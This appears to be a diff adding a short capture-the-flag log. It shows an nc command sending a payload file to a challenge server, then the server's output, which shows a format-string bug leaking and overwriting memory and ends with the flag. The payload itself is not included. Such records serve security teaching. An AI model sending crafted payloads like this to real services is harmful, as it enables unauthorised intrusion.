@@ -1,0 +1,5 @@
+$ nc 140.110.112.77 6131 < payload
+
+Please input your key :Your key is AAAAAAAABBBBBBBBCCCCCCCCDDDD7«
+Are you sure ? (Y/N)Door open. OwO
+MyFirstCTF{Us3_f0rm4T_sTr1ng_t0_134k_&_wr1t3}
